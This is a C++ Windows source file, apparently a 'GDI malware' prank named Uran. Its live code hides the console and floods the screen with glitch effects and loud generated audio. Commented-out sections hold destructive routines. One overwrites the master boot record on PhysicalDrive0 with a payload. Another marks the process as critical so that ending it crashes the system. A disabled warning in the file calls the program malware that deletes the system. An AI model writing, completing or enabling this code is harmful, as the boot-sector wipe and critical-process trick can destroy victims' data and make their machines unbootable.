// Uran.cpp: определяет точку входа для консольного приложения.
//

#include "stdafx.h"
#include <windows.h>
#include <time.h>
#define USE_MATH_DEFINES 1
#include <cmath>
#include <iostream>
#define M_PI 3.14159265358979323846
#pragma comment(lib, "winmm.lib")
/*#pragma comment(lib, "../../../libs/ntdll.lib")
#include <winternl.h>
#include "../../../libs/mbr.h"
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumerOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Respnese);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
BOOLEAN bl; ULONG BreakOnTermination;
NTSTATUS status;
HANDLE hProcess = nullptr;*/
using namespace std;

DWORD WINAPI wow1(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(10*((3*3)*(4*4))==1440)
	{
		StretchBlt(hdc, 12.5, 12.5, x - 5, y - 1, hdc, 0, 0, x, y, SRCINVERT);
	}
	return 0;
}

DWORD WINAPI invert(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(-1+1==0)
	{
		PatBlt(hdc, 0, 0, x, y, PATINVERT);
		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI wow2(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(2*(6+4)+3*(1+2)==20+9)
	{
		StretchBlt(hdc, 12.5, 12.5, x, y - 25, hdc, 0, 0, x - 25, y, SRCCOPY);
	}
	return 0;
}
DWORD WINAPI wow3(LPVOID lpvd)
{
    int screen_w = GetSystemMetrics(0);
    int screen_h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    POINT pt;
    int xs = 100;
    int ys = 100;
    POINT p1;
    int steepcounter = 0;
    int soedbrush = 0;
    
    HDC v1;
    int v2;
    __int64 v3;
    int v4;
    int v5;
    int v6;
    int v7;
    int v8;
    int v9;
    double v10;
    HICON v11;
    float v12;
    float v13;
    int v15;
    int v16;
    int x = 10;
    int y = 10;
    v1 = GetDC(0i64);
    v15 = GetSystemMetrics(0);
    v2 = v15;
    v3 = 32518i64;
    v4 = GetSystemMetrics(1);
    v16 = v4;
    double angle = 0;
    if (NULL != 1)
    {
        steepcounter += 1;
 
 
        v5 = v15 / 10;
        do
        {
            v6 = rand() % v2;
            v7 = rand() % v4;
            v8 = rand() % 4;
            if (v8)
            {
                if (v8 == 1)
                {
                    v3 = 32515i64;
                }
                else if (v8 == 3)
                {
                    v3 = 32516i64;
                }
            }
            else
            {
                v3 = 32513i64;
            }
            v9 = M_PI;
            if (v5 > 0)
            {
                x += incrementor * signX;
                y += incrementor * signY;
                do
                {
                    v10 = (double)(v9 + 300);
                    v11 = LoadIconW(0i64, (LPCWSTR)v3);
                    v12 = sin((double)(v9)) * (double)v9 + 300;
                    v13 = cos((double)(v9)) * (double)v9 + 300;
                    DrawIcon(v1, x - (int)v13, y - (int)v12, v11);
                    if (NULL == 1)
                        break;
                    v9 += 1;
                } while (v9 < v5);
                v2 = v15;
                v4 = v16;
            }
 
            if (y == GetSystemMetrics(SM_CYSCREEN))
            {
                signY = -1;
            }
 
            if (x == GetSystemMetrics(SM_CXSCREEN))
            {
                signX = -1;
            }
 
            if (y == 0)
            {
                signY = 1;
            }
 
            if (x == 0)
            {
                signX = 1;
            }
 
            InvalidateRect(0i64, 0i64, 0);
        } while (NULL != 1);
    }
}

DWORD WINAPI hely(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while(1!=2)
	{
		BitBlt(hdc, rand() % x, rand() % y, rand() % x + 200, rand() % y + 200, hdc, rand() % x, rand() % y, NOTSRCCOPY);
		Sleep(1000);
	}
}

DWORD WINAPI line(LPVOID lpvd)
{
    HDC hdc = GetDC(HWND_DESKTOP);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HDC desk = GetDC(0);
    int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
    while (10+10!=100)
    {
        if (rand() % 25 == 9)
        {
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(desk, brush);
            Sleep(5000);
        }
 
        if (rand() % 2 == 1) {
            LineTo(desk, rand() % xs, rand() % ys);
            RoundRect(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
            Sleep(1000);
        }
    }
}
 
VOID WINAPI ci(int x, int y, int w, int h)
{
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
    DeleteObject(hrgn);
}

DWORD WINAPI Effect(LPVOID lpvd)
{
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int x = rect.right - rect.left - 500, y = rect.bottom - rect.top - 500;
	while(true)
	{
	   const int size = 700;
	   int w = rand() % (x + size) - size / 2, h = rand() % (y + size) - size / 2;
 
        for (int i = 0; i < size; i += 100)
        {
            ci(h - i / 2, h - i / 2, i, i);
            Sleep(25);
        }
	}
	return 0;
}

DWORD WINAPI wow4(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);
	double r = 0;
	for(;;) {
		for (double k = 0; k < x + y; k+=0.99f) {
			int a = sin(r) * 20;
			BitBlt(hdc, 0, k, x, 1, hdc, a, k, SRCCOPY);
			r += M_PI / 80;
		}
		Sleep(25);
	}
}

/*DWORD WINAPI process(LPVOID lpvd)
{
  while (true) 
  {
    if (!NT_SUCCESS(RtlAdjustPrivilege(20, TRUE, FALSE, &bl))) { return 1; } hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()); if (hProcess == nullptr) { return 1; }
    BreakOnTermination = 1;
    status = NtSetInformationProcess(hProcess, 0x1d, &BreakOnTermination, sizeof(ULONG)); CloseHandle(hProcess);
    Sleep(300);
  }
}

VOID WINAPI MBR()
{
	DWORD Write;
	HANDLE mbr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	WriteFile(mbr, binary, mbr_size, &Write, 0);
	CloseHandle(mbr);
}*/

DWORD WINAPI s()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>((t << 2 >> 8) * (t << 1));
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
   return 0;
}

VOID WINAPI s1()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t*5&t>>7)|(t*3&t>>10);
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
   //return 0;
}

VOID WINAPI s2()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t*9&t>>4|t*5&t>>7|t*3&t/1024)-1;
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
   //return 0;
}

VOID WINAPI s3()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>((t << 2 >> 8) * (t << 1));
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
   //return 0;
}

VOID WINAPI s4()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t*(t^t+(t>>15|1)^(t-1280^t)>>10));
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
   //return 0;
}

VOID WINAPI s5()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t&t>>12)*(t>>4|t>>8)^t>>6;
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
   //return 0;
}

VOID WINAPI s6()
{
   HWAVEOUT hwo = 0;
   WAVEFORMATEX wfx = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
   waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

   char buffer[8000 * 20];

   for (DWORD t = 0; t < sizeof(buffer); t++)
	   buffer[t] = static_cast<char>(t>>6|t|t>>(t>>16))*10+((t>>11)&7);
   WAVEHDR hdr = {buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0};
   waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
   waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
   waveOutClose(hwo);
   //return 0;
}

int main()
{
  system("color 4a");
  int a;
  char b,c;
  cout << "2*2=";
  cin >> a;
  if (a!=4) {
	  cout << "Wrong!\n";
	  system("pause");
	  exit(0);
  }

  /*cout << "Warning!\nit's malware it's deletes your system, Run it?\nY - Yes\n[Any charter] - No\n>>>";
  cin >> b;
  if (!(!(!(b=='y')))) exit(0);

  cout << "Final warning!\nit's malware it's deletes your system, Run it?\nY - Yes\n[Any charter] - No\n>>>";
  cin >> c;
  if (!(!(c!='y'))) exit(0);*/

  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
  //MBR();
  //CreateThread(0,0,process,0,0,0);
  srand(time(0));
  int RandomValue, RandomSoundValue, i = 0;
  while(i<7)
  {
	RandomValue = rand() % 7;
	RandomSoundValue = rand() % 7;
	switch(RandomValue)
	{
	  case 0:
	  {
	     HANDLE wow1Start = CreateThread(0, 0, wow1, 0, 0, 0);
		 if (RandomSoundValue == 0) s();
		 if (RandomSoundValue == 1) s1();
		 if (RandomSoundValue == 2) s2();
		 if (RandomSoundValue == 3) s3();
		 if (RandomSoundValue == 4) s4();
		 if (RandomSoundValue == 5) s5();
		 if (RandomSoundValue == 6) s6();
	     Sleep(30000);
	     TerminateThread(wow1Start, 0);
	     CloseHandle(wow1Start);
		 break;
	  }
	  case 1:
	  {
		 HANDLE wow3Start = CreateThread(0, 0, wow3, 0, 0, 0);
		 if (RandomSoundValue == 0) s();
		 if (RandomSoundValue == 1) s1();
		 if (RandomSoundValue == 2) s2();
		 if (RandomSoundValue == 3) s3();
		 if (RandomSoundValue == 4) s4();
		 if (RandomSoundValue == 5) s5();
		 if (RandomSoundValue == 6) s6();
	     Sleep(30000);
	     TerminateThread(wow3Start, 0);
	     CloseHandle(wow3Start);
		 break;
	  }
	  case 2:
	  {
	     HANDLE wow2Start = CreateThread(0, 0, wow2, 0, 0, 0);
		 if (RandomSoundValue == 0) s();
		 if (RandomSoundValue == 1) s1();
		 if (RandomSoundValue == 2) s2();
		 if (RandomSoundValue == 3) s3();
		 if (RandomSoundValue == 4) s4();
		 if (RandomSoundValue == 5) s5();
		 if (RandomSoundValue == 6) s6();
	     Sleep(30000);
	     TerminateThread(wow2Start, 0);
	     CloseHandle(wow2Start);
		 break;
	  }
	  case 3:
	  {
		 HANDLE helyStart = CreateThread(0, 0, hely, 0, 0, 0);
		 if (RandomSoundValue == 0) s();
		 if (RandomSoundValue == 1) s1();
		 if (RandomSoundValue == 2) s2();
		 if (RandomSoundValue == 3) s3();
		 if (RandomSoundValue == 4) s4();
		 if (RandomSoundValue == 5) s5();
		 if (RandomSoundValue == 6) s6();
		 Sleep(30000);
		 TerminateThread(helyStart, 0);
		 CloseHandle(helyStart);
		 break;
	  }
	  case 4:
	  {
		 HANDLE lineStart = CreateThread(0, 0, line, 0, 0, 0);
		 if (RandomSoundValue == 0) s();
		 if (RandomSoundValue == 1) s1();
		 if (RandomSoundValue == 2) s2();
		 if (RandomSoundValue == 3) s3();
		 if (RandomSoundValue == 4) s4();
		 if (RandomSoundValue == 5) s5();
		 if (RandomSoundValue == 6) s6();
		 Sleep(30000);
		 TerminateThread(lineStart, 0);
		 CloseHandle(lineStart);
		 break;
	  }
	  case 5:
	  {
		 HANDLE EffectRun = CreateThread(0, 0, Effect, 0, 0, 0);
		 if (RandomSoundValue == 0) s();
		 if (RandomSoundValue == 1) s1();
		 if (RandomSoundValue == 2) s2();
		 if (RandomSoundValue == 3) s3();
		 if (RandomSoundValue == 4) s4();
		 if (RandomSoundValue == 5) s5();
		 if (RandomSoundValue == 6) s6();
		 Sleep(30000);
		 TerminateThread(EffectRun, 0);
		 CloseHandle(EffectRun);
	  }
	  case 6:
	  {
		 HANDLE Wow4Run = CreateThread(0, 0, wow4, 0, 0, 0);
		 if (RandomSoundValue == 0) s();
		 if (RandomSoundValue == 1) s1();
		 if (RandomSoundValue == 2) s2();
		 if (RandomSoundValue == 3) s3();
		 if (RandomSoundValue == 4) s4();
		 if (RandomSoundValue == 5) s5();
		 if (RandomSoundValue == 6) s6();
		 Sleep(30000);
		 TerminateThread(Wow4Run, 0);
		 CloseHandle(Wow4Run);
	  }
	}
	i++;
   }
   exit(0);
   return 0;
}

